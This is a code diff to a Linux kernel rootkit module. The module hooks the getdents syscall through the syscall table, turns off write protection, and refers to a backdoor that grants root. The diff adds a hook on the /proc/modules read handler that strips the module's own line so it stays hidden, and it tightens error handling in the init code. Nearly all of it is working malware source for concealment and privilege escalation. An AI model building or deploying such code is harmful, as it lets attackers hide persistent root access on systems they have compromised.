@@ -4,6 +4,7 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/string.h>
+#include <linux/syscalls.h>
 #include <linux/version.h>
 #include <asm/special_insns.h>
 #include <asm/tlbflush.h>
@@ -14,9 +15,12 @@ MODULE_AUTHOR("subut4i");
 MODULE_DESCRIPTION("This is not a rootkit.");
 MODULE_VERSION("0.1");
 
+extern unsigned long loops_per_jiffy;
 static unsigned long * syscall_table;
 static int (*fixed_set_memory_rw)(unsigned long, int);
 static int (*fixed_set_memory_ro)(unsigned long, int);
+
+static struct file_operations* proc_modules_operations;
 
 #define GETDENTS_SYSCALL_NUM 78
 #define WR_PR (1u << 16)
@@ -38,6 +42,36 @@ typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent _
 // the original handler
 sys_getdents_t sys_getdents_orig = NULL;
 
+
+typedef ssize_t (*proc_modules_read_t) (struct file *, char __user *, size_t, loff_t *); 
+// the original read handler
+proc_modules_read_t proc_modules_read_orig = NULL;
+
+// our new /proc/modules read handler
+static ssize_t 
+proc_modules_read_new (struct file *f, char __user *buf, size_t len, loff_t *offset) 
+{
+	char* bad_line = NULL;
+	char* bad_line_end = NULL;
+	ssize_t ret = proc_modules_read_orig(f, buf, len, offset);
+	// search in the buf for MODULE_NAME, and remove that line
+	bad_line = strnstr(buf, MODULE_NAME, ret);
+	if (bad_line != NULL) {
+		// find the end of the line
+		for (bad_line_end = bad_line; bad_line_end < (buf + ret); bad_line_end++) {
+			if (*bad_line_end == '\n') {
+				bad_line_end++; // go past the line end, so we remove that too
+				break;
+			}
+		}
+		// copy over the bad line
+		memcpy(bad_line, bad_line_end, (buf+ret) - bad_line_end);
+		// adjust the size of the return value
+		ret -= (ssize_t)(bad_line_end - bad_line);
+	}
+	
+	return ret;
+}
 
 /* 
  * Hook an existing proc/dev file to give us a backdoor (give current user root)
@@ -111,15 +145,28 @@ init_syscall_table (void)
 
     if (!fixed_set_memory_rw) {
         printk(KERN_INFO "Unable to find set_memory_rw\n");
+        return -1;
     }
 
     fixed_set_memory_ro = (void*)kallsyms_lookup_name("set_memory_ro");
     if (!fixed_set_memory_ro) {
         printk(KERN_INFO "Unable to find set_memory_ro\n");
+        return -1;
     }
 
     printk(KERN_INFO "syscall init done\n");
 
+    return 0;
+}
+
+static int
+init_proc (void)
+{
+    proc_modules_operations = (struct file_operations*)kallsyms_lookup_name("proc_modules_operations");
+    if (!proc_modules_operations) {
+        printk(KERN_INFO "Unable to find module operations address\n");
+        return -1;
+    }
     return 0;
 }
 
@@ -128,12 +175,22 @@ rootkit_init (void)
 {
     int ret;
 
-    init_syscall_table();
+    if (init_syscall_table()) {
+        printk(KERN_ERR "Could not init syscall table\n");
+        return -1;
+    }
 
     printk(KERN_INFO "sys_call_table @ %p\n", syscall_table);
+
+    if (init_proc()) {
+        printk(KERN_ERR "Could not init proc\n");
+        return -1;
+    }
+
 	
 	// record the original getdents handler
 	sys_getdents_orig = (sys_getdents_t)((void**)syscall_table)[GETDENTS_SYSCALL_NUM];
+    proc_modules_read_orig = proc_modules_operations->read;
 	
 	printk(KERN_INFO "original sys_getdents @ %p\n", sys_getdents_orig);
 
@@ -148,6 +205,7 @@ rootkit_init (void)
 
     
     syscall_table[GETDENTS_SYSCALL_NUM] = sys_getdents_new;
+    proc_modules_operations->read = proc_modules_read_new;
 
     write_cr0(read_cr0() | WR_PR);
     ret = fixed_set_memory_ro(PAGE_ALIGN((unsigned long)syscall_table) - PAGE_SIZE, 1);
